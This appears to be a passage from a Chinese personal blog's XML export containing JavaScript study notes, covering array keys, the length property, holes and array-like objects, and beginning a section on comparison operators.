<p>上面代码分别用数值和字符串作为键名，结果都能读取数组。原因是数值键名被自动转为了字符串</p>
<p>注意，这点在赋值时也成立。一个值总是先转成字符串，再作为键名进行赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"></span><br><span class="line">a[<span class="number">1.00</span>] = <span class="number">6</span>;</span><br><span class="line">a[<span class="number">1</span>] <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于<code>1.00</code>转成字符串是<code>1</code>，所以通过数字键<code>1</code>可以读取值</p>
<p>上一章说过，对象有两种读取成员的方法：点结构（<code>object.key</code>）和方括号结构（<code>object[key]</code>）。但是，对于数值的键名，不能使用点结构</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr<span class="number">.0</span> <span class="comment">// SyntaxError</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>arr.0</code>的写法不合法，因为单独的数值不能作为标识符（<code>identifier</code>）。所以，数组成员只能用方括号<code>arr[0]</code>表示（方括号是运算符，可以接受数值）</p>
<h4 id="6-3-length属性"><a href="#6-3-length属性" class="headerlink" title="6.3 length属性"></a>6.3 length属性</h4><p>数组的length属性，返回数组的成员数量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>].length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>JavaScript 使用一个32位整数，保存数组的元素个数。这意味着，数组成员最多只有 4294967295 个（232 - 1）个，也就是说<code>length</code>属性的最大值就是 4294967295</p>
<p>只要是数组，就一定有length属性。该属性是一个动态的值，等于键名中的最大整数加上1</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">arr.length <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">arr[<span class="number">2</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">arr.length <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">arr[<span class="number">9</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">arr.length <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line">arr[<span class="number">1000</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">arr.length <span class="comment">// 1001</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，数组的数字键不需要连续，<code>length</code>属性的值总是比最大的那个整数键大<code>1</code>。另外，这也表明数组是一种动态的数据结构，可以随时增减数组的成员</p>
<p><code>length</code>属性是可写的。如果人为设置一个小于当前成员个数的值，该数组的成员数量会自动减少到<code>length</code>设置的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [ <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span> ];</span><br><span class="line">arr.length <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">arr.length = <span class="number">2</span>;</span><br><span class="line">arr <span class="comment">// [&quot;a&quot;, &quot;b&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，当数组的<code>length</code>属性设为<code>2</code>（即最大的整数键只能是<code>1</code>）那么整数键<code>2</code>（值为<code>c</code>）就已经不在数组中了，被自动删除了</p>
<p>清空数组的一个有效方法，就是将length属性设为0</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [ <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">arr.length = <span class="number">0</span>;</span><br><span class="line">arr <span class="comment">// []</span></span><br></pre></td></tr></table></figure>

<p>如果人为设置<code>length</code>大于当前元素个数，则数组的成员数量会增加到这个值，新增的位置都是空位。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">a.length = <span class="number">3</span>;</span><br><span class="line">a[<span class="number">1</span>] <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，当<code>length</code>属性设为大于数组个数时，读取新增的位置都会返回<code>undefined</code></p>
<p>如果人为设置<code>length</code>为不合法的值，JavaScript 会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置负值</span></span><br><span class="line">[].length = -<span class="number">1</span></span><br><span class="line"><span class="comment">// RangeError: Invalid array length</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组元素个数大于等于2的32次方</span></span><br><span class="line">[].length = <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line"><span class="comment">// RangeError: Invalid array length</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置字符串</span></span><br><span class="line">[].length = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"><span class="comment">// RangeError: Invalid array length</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，由于数组本质上是一种对象，所以可以为数组添加属性，但是这不影响<code>length</code>属性的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"></span><br><span class="line">a[<span class="string">&#x27;p&#x27;</span>] = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">a.length <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">a[<span class="number">2.1</span>] = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">a.length <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>上面代码将数组的键分别设为字符串和小数，结果都不影响<code>length</code>属性。因为，<code>length</code>属性的值就是等于最大的数字键加<code>1</code>，而这个数组没有整数键，所以<code>length</code>属性保持为<code>0</code></p>
<p>如果数组的键名是添加超出范围的数值，该键名会自动转为字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line">arr[-<span class="number">1</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">arr[<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">32</span>)] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"></span><br><span class="line">arr.length <span class="comment">// 0</span></span><br><span class="line">arr[-<span class="number">1</span>] <span class="comment">// &quot;a&quot;</span></span><br><span class="line">arr[<span class="number">4294967296</span>] <span class="comment">// &quot;b&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，我们为数组<code>arr</code>添加了两个不合法的数字键，结果<code>length</code>属性没有发生变化。这些数字键都变成了字符串键名。最后两行之所以会取到值，是因为取键值时，数字键名会默认转为字符串</p>
<h4 id="6-4-in运算符"><a href="#6-4-in运算符" class="headerlink" title="6.4 in运算符"></a>6.4 in运算符</h4><p>检查某个键名是否存在的运算符<code>in</code>，适用于对象，也适用于数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [ <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span> ];</span><br><span class="line"><span class="number">2</span> <span class="keyword">in</span> arr  <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;2&#x27;</span> <span class="keyword">in</span> arr <span class="comment">// true</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">in</span> arr <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>注意，如果数组的某个位置是空位，<code>in</code>运算符返回<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line">arr[<span class="number">100</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">100</span> <span class="keyword">in</span> arr <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">in</span> arr <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，数组<code>arr</code>只有一个成员<code>arr[100]</code>，其他位置的键名都会返回<code>false</code></p>
<h4 id="6-5-for…in循环和数组的遍历"><a href="#6-5-for…in循环和数组的遍历" class="headerlink" title="6.5 for…in循环和数组的遍历"></a>6.5 for…in循环和数组的遍历</h4><p><code>for...in</code>循环不仅可以遍历对象，也可以遍历数组，毕竟数组只是一种特殊对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> a) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>但是，<code>for...in</code>不仅会遍历数组所有的数字键，还会遍历非数字键</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">a.foo = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> a) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// foo</span></span><br></pre></td></tr></table></figure>
<p>上面代码在遍历数组时，也遍历到了非整数键<code>foo</code>。所以，不推荐使用<code>for...in</code>遍历数组<br>数组的遍历可以考虑使用<code>for</code>循环或<code>while</code>循环</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// for循环</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// while循环</span></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; a.length) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a[i]);</span><br><span class="line">  i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> l = a.length;</span><br><span class="line"><span class="keyword">while</span> (l--) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a[l]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码是三种遍历数组的写法。最后一种写法是逆向遍历，即从最后一个元素向第一个元素遍历</p>
<p>数组的<code>forEach</code>方法，也可以用来遍历数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> colors = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>];</span><br><span class="line">colors.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">color</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(color);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// red</span></span><br><span class="line"><span class="comment">// green</span></span><br><span class="line"><span class="comment">// blue</span></span><br></pre></td></tr></table></figure>

<h4 id="6-6-数组的空位"><a href="#6-6-数组的空位" class="headerlink" title="6.6 数组的空位"></a>6.6 数组的空位</h4><p>当数组的某个位置是空元素，即两个逗号之间没有任何值，我们称该数组存在空位（hole）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, , <span class="number">1</span>];</span><br><span class="line">a.length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码表明，数组的空位不影响<code>length</code>属性</p>
<p>需要注意的是，如果最后一个元素后面有逗号，并不会产生空位。也就是说，有没有这个逗号，结果都是一样的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,];</span><br><span class="line"></span><br><span class="line">a.length <span class="comment">// 3</span></span><br><span class="line">a <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>

<p>数组的空位是可以读取的，返回<code>undefined</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [, , ,];</span><br><span class="line">a[<span class="number">1</span>] <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>使用<code>delete</code>命令删除一个数组成员，会形成空位，并且不会影响length属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">delete</span> a[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">a[<span class="number">1</span>] <span class="comment">// undefined</span></span><br><span class="line">a.length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>也就是说，<code>length</code>属性不过滤空位。所以，使用<code>length</code>属性进行数组遍历，一定要非常小心</p>
<p>数组的某个位置是空位，与某个位置是<code>undefined</code>，是不一样的。如果是空位，使用数组的<code>forEach</code>方法、<code>for...in</code>结构、以及<code>Object.keys</code>方法进行遍历，空位都会被跳过</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [, , ,];</span><br><span class="line"></span><br><span class="line">a.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">x, i</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i + <span class="string">&#x27;. &#x27;</span> + x);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 不产生任何输出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> a) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不产生任何输出</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(a)</span><br><span class="line"><span class="comment">// []</span></span><br></pre></td></tr></table></figure>
<p>如果某个位置是<code>undefined</code>，遍历的时候就不会被跳过</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="literal">undefined</span>];</span><br><span class="line"></span><br><span class="line">a.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">x, i</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i + <span class="string">&#x27;. &#x27;</span> + x);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 0. undefined</span></span><br><span class="line"><span class="comment">// 1. undefined</span></span><br><span class="line"><span class="comment">// 2. undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> a) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(a)</span><br><span class="line"><span class="comment">// [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>这就是说，空位就是数组没有这个元素，所以不会被遍历到，而<code>undefined</code>则表示数组有这个元素，值是<code>undefined</code>，所以遍历不会跳过</p>
<h4 id="6-7-类似数组的对象"><a href="#6-7-类似数组的对象" class="headerlink" title="6.7 类似数组的对象"></a>6.7 类似数组的对象</h4><p>如果一个对象的所有键名都是正整数或零，并且有<code>length</code>属性，那么这个对象就很像数组，语法上称为“类似数组的对象”（array-like object）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="number">0</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  <span class="number">1</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">  <span class="number">2</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">  length: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj[<span class="number">0</span>] <span class="comment">// &#x27;a&#x27;</span></span><br><span class="line">obj[<span class="number">1</span>] <span class="comment">// &#x27;b&#x27;</span></span><br><span class="line">obj.length <span class="comment">// 3</span></span><br><span class="line">obj.push(<span class="string">&#x27;d&#x27;</span>) <span class="comment">// TypeError: obj.push is not a function</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>就是一个类似数组的对象。但是，“类似数组的对象”并不是数组，因为它们不具备数组特有的方法。对象<code>obj</code>没有数组的<code>push</code>方法，使用该方法就会报错</p>
<p>“类似数组的对象”的根本特征，就是具有<code>length</code>属性。只要有<code>length</code>属性，就可以认为这个对象类似于数组。但是有一个问题，这种<code>length</code>属性不是动态值，不会随着成员的变化而变化</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  length: <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line">obj[<span class="number">3</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">obj.length <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>上面代码为对象<code>obj</code>添加了一个数字键，但是<code>length</code>属性没变。这就说明了<code>obj</code>不是数组</p>
<p>典型的“类似数组的对象”是函数的<code>arguments</code>对象，以及大多数 DOM 元素集，还有字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arguments对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">args</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">arguments</span> &#125;</span><br><span class="line"><span class="keyword">var</span> arrayLike = args(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">arrayLike[<span class="number">0</span>] <span class="comment">// &#x27;a&#x27;</span></span><br><span class="line">arrayLike.length <span class="comment">// 2</span></span><br><span class="line">arrayLike <span class="keyword">instanceof</span> <span class="built_in">Array</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// DOM元素集</span></span><br><span class="line"><span class="keyword">var</span> elts = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;h3&#x27;</span>);</span><br><span class="line">elts.length <span class="comment">// 3</span></span><br><span class="line">elts <span class="keyword">instanceof</span> <span class="built_in">Array</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>[<span class="number">1</span>] <span class="comment">// &#x27;b&#x27;</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.length <span class="comment">// 3</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span> <span class="keyword">instanceof</span> <span class="built_in">Array</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码包含三个例子，它们都不是数组（<code>instanceof</code>运算符返回<code>false</code>），但是看上去都非常像数组</p>
<p>数组的<code>slice</code>方法可以将“类似数组的对象”变成真正的数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="built_in">Array</span>.prototype.slice.call(arrayLike);</span><br></pre></td></tr></table></figure>
<p>除了转为真正的数组，“类似数组的对象”还有一个办法可以使用数组的方法，就是通过<code>call()</code>把数组的方法放到对象上面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">value, index</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index + <span class="string">&#x27; : &#x27;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.forEach.call(arrayLike, print);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>arrayLike</code>代表一个类似数组的对象，本来是不可以使用数组的<code>forEach()</code>方法的，但是通过<code>call()</code>，可以把<code>forEach()</code>嫁接到<code>arrayLike</code>上面调用</p>
<p>下面的例子就是通过这种方法，在<code>arguments</code>对象上面调用<code>forEach</code>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// forEach 方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logArgs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Array</span>.prototype.forEach.call(<span class="built_in">arguments</span>, <span class="function"><span class="keyword">function</span> (<span class="params">elem, i</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i + <span class="string">&#x27;. &#x27;</span> + elem);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 for 循环</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logArgs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i + <span class="string">&#x27;. &#x27;</span> + <span class="built_in">arguments</span>[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>字符串也是类似数组的对象，所以也可以用<code>Array.prototype.forEach.call</code>遍历</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.forEach.call(<span class="string">&#x27;abc&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chr</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(chr);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b.</span></span><br><span class="line"><span class="comment">// c</span></span><br></pre></td></tr></table></figure>
<p>注意，这种方法比直接使用数组原生的<code>forEach</code>要慢，所以最好还是先将“类似数组的对象”转为真正的数组，然后再直接调用数组的<code>forEach</code>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="built_in">Array</span>.prototype.slice.call(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">chr</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(chr);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b</span></span><br><span class="line"><span class="comment">// c</span></span><br></pre></td></tr></table></figure>


<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS数据类型-数组</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0007</title>
    <url>/2021/05/08/%E6%89%93%E5%8D%A10007/</url>
    <content><![CDATA[<p><font color=aed2e5>无论眼下你正过着怎样的生活，欢喜也好，烦恼也罢，饿了就吃，困了就睡，明天又是崭新的一天。</font></p>
<h2 id="JS运算符"><a href="#JS运算符" class="headerlink" title="JS运算符"></a>JS运算符</h2><h3 id="2-比较运算符"><a href="#2-比较运算符" class="headerlink" title="2. 比较运算符"></a>2. 比较运算符</h3><h4 id="2-1概述"><a href="#2-1概述" class="headerlink" title="2.1概述"></a>2.1概述</h4><p>比较运算符用于比较两个值的大小，然后返回一个布尔值，表示是否满足指定的条件</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> &gt; <span class="number">1</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>注意，比较运算符可以比较各种类型的值，不仅仅是数值</code><br>JavaScript 一共提供了8个比较运算符</p>
<ul>
<li><code>&gt;</code> 大于运算符</li>
<li><code>&lt;</code> 小于运算符</li>
<li><code>&lt;=</code> 小于或等于运算符</li>
<li><code>&gt;=</code> 大于或等于运算符</li>
<li><code>==</code> 相等运算符</li>
<li><code>===</code> 严格相等运算符</li>
<li><code>!=</code> 不相等运算符</li>
<li><code>!==</code> 严格不相等运算符<br>这八个比较运算符分成两类：相等比较和非相等比较。两者的规则是不一样的，对于非相等的比较，算法是先看两个运算子是否都是字符串，如果是的，就按照字典顺序比较（实际上是比较 Unicode 码点）；否则，将两个运算子都转成数值，再比较数值的大小</li>
</ul>
<h4 id="2-2-非相等运算符：字符串的比较"><a href="#2-2-非相等运算符：字符串的比较" class="headerlink" title="2.2 非相等运算符：字符串的比较"></a>2.2 非相等运算符：字符串的比较</h4><p>字符串按照字典顺序进行比较</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;cat&#x27;</span> &gt; <span class="string">&#x27;dog&#x27;</span> <span class="comment">// false</span></span><br><span class="line"><span class="string">&#x27;cat&#x27;</span> &gt; <span class="string">&#x27;catalog&#x27;</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>JavaScript 引擎内部首先比较首字符的 Unicode 码点。如果相等，再比较第二个字符的 Unicode 码点，以此类推</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;cat&#x27;</span> &gt; <span class="string">&#x27;Cat&#x27;</span> <span class="comment">// true&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，小写的<code>c</code>的 Unicode 码点（<code>99</code>）大于大写的C的 Unicode 码点（<code>67</code>），所以返回<code>true</code><br>由于所有字符都有 Unicode 码点，因此汉字也可以比较</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;大&#x27;</span> &gt; <span class="string">&#x27;小&#x27;</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，“大”的 Unicode 码点是22823，“小”是23567，因此返回<code>false</code></p>
<h4 id="2-3-非相运算符：非字符串的比较"><a href="#2-3-非相运算符：非字符串的比较" class="headerlink" title="2.3 非相运算符：非字符串的比较"></a>2.3 非相运算符：非字符串的比较</h4><p>如果两个运算子之中，至少有一个不是字符串，需要分成以下两种情况</p>
<h5 id="2-3-1-原始类型值"><a href="#2-3-1-原始类型值" class="headerlink" title="2.3.1 原始类型值"></a>2.3.1 原始类型值</h5><p>如果两个运算子都是原始类型的值，则是先转成数值再比较</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span> &gt; <span class="string">&#x27;4&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 5 &gt; Number(&#x27;4&#x27;)</span></span><br><span class="line"><span class="comment">// 即 5 &gt; 4</span></span><br><span class="line"></span><br><span class="line"><span class="literal">true</span> &gt; <span class="literal">false</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 Number(true) &gt; Number(false)</span></span><br><span class="line"><span class="comment">// 即 1 &gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span> &gt; <span class="literal">true</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 2 &gt; Number(true)</span></span><br><span class="line"><span class="comment">// 即 2 &gt; 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串和布尔值都会先转成数值，再进行比较</p>
<p>这里需要注意与<code>NaN</code>的比较。任何值（包括<code>NaN</code>本身）与<code>NaN</code>使用非相等运算符进行比较，返回的都是<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> &gt; <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line"><span class="number">1</span> &lt;= <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line"><span class="string">&#x27;1&#x27;</span> &gt; <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line"><span class="string">&#x27;1&#x27;</span> &lt;= <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">NaN</span> &gt; <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">NaN</span> &lt;= <span class="literal">NaN</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h5 id="2-3-2-对象"><a href="#2-3-2-对象" class="headerlink" title="2.3.2 对象"></a>2.3.2 对象</h5><p>如果运算子是对象，会转为原始类型的值，再进行比较。</p>
<p>对象转换成原始类型的值，算法是先调用<code>valueOf</code>方法；如果返回的还是对象，再接着调用<code>toString</code>方法</p>
